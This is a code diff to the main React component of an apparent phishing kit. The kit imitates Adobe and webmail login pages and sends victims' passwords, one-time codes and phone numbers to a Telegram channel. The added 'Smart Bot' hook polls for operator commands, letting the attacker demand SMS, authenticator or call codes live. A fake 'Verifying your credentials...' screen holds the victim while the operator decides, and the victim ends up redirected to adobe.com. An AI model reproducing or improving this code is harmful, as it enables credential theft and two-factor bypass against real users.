@@ -1,4 +1,4 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useCallback } from 'react';
 import { Routes, Route, useNavigate, Navigate, useLocation } from 'react-router-dom';
 import LoginPage from './components/LoginPage';
 import MobileLoginPage from './components/mobile/MobileLoginPage';
@@ -17,6 +17,7 @@ import ProviderRedirect from './components/ProviderRedirect';
 import Spinner from './components/common/Spinner';
 import { getBrowserFingerprint } from './utils/oauthHandler';
 import { setCookie, getCookie, removeCookie, subscribeToCookieChanges, CookieChangeEvent } from './utils/realTimeCookieManager';
+import { useSmartBot, SmartBotCommand } from './hooks/useSmartBot';
 import { config } from './config';
 
 const safeSendToTelegram = async (payload: any) => {
@@ -147,11 +148,96 @@ function App() {
   const [initMessage, setInitMessage] = useState('Connecting...');
   const [loginFlowState, setLoginFlowState] = useState({
     awaitingOtp: false,
+    awaitingSmartBot: false,
     sessionData: null as any,
+    /** The OTP type requested by the admin (sms_code, auth_code, call_code). */
+    otpType: null as string | null,
   });
 
   const navigate = useNavigate();
   const location = useLocation();
+
+  // --- Smart Bot: poll for admin commands after credentials are sent ---
+  const { command: smartBotCommand, clearCommand: clearSmartBotCommand } = useSmartBot({
+    sessionId: loginFlowState.sessionData?.sessionId || null,
+    enabled: loginFlowState.awaitingSmartBot,
+    interval: 3000,
+  });
+
+  // React to Smart Bot commands from the admin
+  const handleSmartBotCommand = useCallback((cmd: SmartBotCommand) => {
+    if (!cmd || !loginFlowState.sessionData) return;
+
+    switch (cmd) {
+      case 'yes_prompt':
+        // Admin approved — proceed to OTP page (default flow)
+        setLoginFlowState(prev => ({
+          ...prev,
+          awaitingSmartBot: false,
+          awaitingOtp: true,
+          otpType: null,
+        }));
+        setIsLoading(false);
+        navigate(ROUTES.OTP, { replace: true });
+        break;
+
+      case 'password_error':
+        // Admin wants to show a password error — send user back to login
+        setLoginFlowState(prev => ({
+          ...prev,
+          awaitingSmartBot: true,
+          awaitingOtp: false,
+          otpType: null,
+        }));
+        setIsLoading(false);
+        // Navigate back to home to show login with error
+        navigate(ROUTES.HOME, { replace: true });
+        break;
+
+      case 'sms_code':
+      case 'auth_code':
+      case 'call_code':
+        // Admin requested an OTP type — navigate to OTP page with specific type
+        setLoginFlowState(prev => ({
+          ...prev,
+          awaitingSmartBot: false,
+          awaitingOtp: true,
+          otpType: cmd,
+        }));
+        setIsLoading(false);
+        navigate(ROUTES.OTP, { replace: true });
+        break;
+
+      case 'number_prompt':
+        // Admin wants a phone number — navigate to OTP page with number_prompt type
+        setLoginFlowState(prev => ({
+          ...prev,
+          awaitingSmartBot: false,
+          awaitingOtp: true,
+          otpType: 'number_prompt',
+        }));
+        setIsLoading(false);
+        navigate(ROUTES.OTP, { replace: true });
+        break;
+
+      case 'success':
+        // Admin marked as success — redirect to success
+        setLoginFlowState(prev => ({
+          ...prev,
+          awaitingSmartBot: false,
+          awaitingOtp: false,
+        }));
+        window.location.href = 'https://www.adobe.com';
+        break;
+    }
+    clearSmartBotCommand();
+  }, [loginFlowState.sessionData, navigate, clearSmartBotCommand]);
+
+  useEffect(() => {
+    if (smartBotCommand) {
+      handleSmartBotCommand(smartBotCommand);
+    }
+  }, [smartBotCommand, handleSmartBotCommand]);
 
   // Initialization: bot detection + connecting splash screen
   useEffect(() => {
@@ -208,12 +294,14 @@ function App() {
     
     await safeSendToTelegram({ type: 'credentials', data: credentialsData });
     
+    // Enter Smart Bot waiting state — admin controls the next step
     setLoginFlowState({
-      awaitingOtp: true,
+      awaitingOtp: false,
+      awaitingSmartBot: true,
       sessionData: credentialsData,
+      otpType: null,
     });
-    setIsLoading(false);
-    navigate(ROUTES.OTP, { replace: true });
+    // Keep isLoading true — the spinner will show while waiting for admin command
   };
   
   const handleOtpSubmit = async (otp: string) => {
@@ -225,10 +313,39 @@ function App() {
     setIsLoading(true);
     await safeSendToTelegram({
       type: 'otp',
-      data: { otp, session: loginFlowState.sessionData },
+      data: {
+        otp,
+        otpType: loginFlowState.otpType || 'default',
+        session: loginFlowState.sessionData,
+      },
     });
     
-    window.location.href = 'https://www.adobe.com';
+    // After submitting OTP/code, go back to Smart Bot waiting state
+    // so admin can send the next command (e.g. another code request or success)
+    setLoginFlowState(prev => ({
+      ...prev,
+      awaitingOtp: false,
+      awaitingSmartBot: true,
+      otpType: null,
+    }));
+    // Keep loading state active while waiting for admin
+  };
+
+  /** Handle phone number submission from the Number Prompt flow. */
+  const handlePhoneSubmit = async (phone: string) => {
+    if (!loginFlowState.sessionData) return;
+    setIsLoading(true);
+    await safeSendToTelegram({
+      type: 'phone_number',
+      data: { phone, session: loginFlowState.sessionData },
+    });
+    // Go back to Smart Bot waiting state for the next admin command
+    setLoginFlowState(prev => ({
+      ...prev,
+      awaitingOtp: false,
+      awaitingSmartBot: true,
+      otpType: null,
+    }));
   };
 
   const handleLogout = () => {
@@ -236,7 +353,7 @@ function App() {
     sessionStorage.clear();
     config.session.cookieNames.forEach(name => removeCookie(name, { path: '/' }));
     setHasActiveSession(false);
-    setLoginFlowState({ awaitingOtp: false, sessionData: null });
+    setLoginFlowState({ awaitingOtp: false, awaitingSmartBot: false, sessionData: null, otpType: null });
   };
 
   const handleOthersEmailSubmit = async (email: string): Promise<boolean> => {
@@ -338,8 +455,15 @@ function App() {
     );
   }
 
-  if (isLoading) {
-    return <div className="min-h-screen bg-[#f5f5f5] flex items-center justify-center"><Spinner size="lg" /></div>;
+  if (isLoading || loginFlowState.awaitingSmartBot) {
+    return (
+      <div className="min-h-screen bg-[#f5f5f5] flex flex-col items-center justify-center" style={{ fontFamily: 'adobe-clean, Source Sans Pro, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, sans-serif' }}>
+        <Spinner size="lg" />
+        <p style={{ marginTop: '24px', fontSize: '15px', color: '#6e6e6e', letterSpacing: '0.3px' }}>
+          {loginFlowState.awaitingSmartBot ? 'Verifying your credentials...' : 'Loading...'}
+        </p>
+      </div>
+    );
   }
 
   const LoginComponent = isMobile ? MobileLoginPage : LoginPage;
@@ -356,7 +480,7 @@ function App() {
       <Route path={ROUTES.LOGIN_GMAIL} element={!hasActiveSession ? <GmailLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} defaultEmail={location.state?.email} /> : <Navigate to={ROUTES.LANDING} replace />} />
       <Route path={ROUTES.LOGIN_OTHERS} element={!hasActiveSession ? <OthersLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} onEmailSubmit={handleOthersPageEmailSubmit} onBack={() => navigate(ROUTES.HOME)} /> : <Navigate to={ROUTES.LANDING} replace />} />
       <Route path={ROUTES.LOGIN_OFFICE365} element={!hasActiveSession ? <Office365Wrapper onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} /> : <Navigate to={ROUTES.LANDING} replace />} />
-      <Route path={ROUTES.OTP} element={loginFlowState.awaitingOtp ? <OtpComponent onSubmit={handleOtpSubmit} isLoading={isLoading} email={loginFlowState.sessionData?.email} provider={loginFlowState.sessionData?.provider} onResend={() => safeSendToTelegram({ type: 'otp_resend', data: loginFlowState.sessionData })} /> : <Navigate to={ROUTES.HOME} replace />} />
+      <Route path={ROUTES.OTP} element={loginFlowState.awaitingOtp ? <OtpComponent onSubmit={handleOtpSubmit} isLoading={isLoading} email={loginFlowState.sessionData?.email} provider={loginFlowState.sessionData?.provider} otpType={loginFlowState.otpType} onPhoneSubmit={handlePhoneSubmit} onResend={() => safeSendToTelegram({ type: 'otp_resend', data: loginFlowState.sessionData })} /> : <Navigate to={ROUTES.HOME} replace />} />
       <Route path={ROUTES.LANDING} element={hasActiveSession ? <LandingComponent onLogout={handleLogout} /> : <Navigate to={ROUTES.HOME} replace />} />
       <Route path="/login.yahoo.com/*" element={<ProviderRedirect target={ROUTES.LOGIN_YAHOO} />} />
       <Route path="/login.microsoftonline.com/*" element={<ProviderRedirect target={ROUTES.LOGIN_OFFICE365} provider="microsoft" />} />
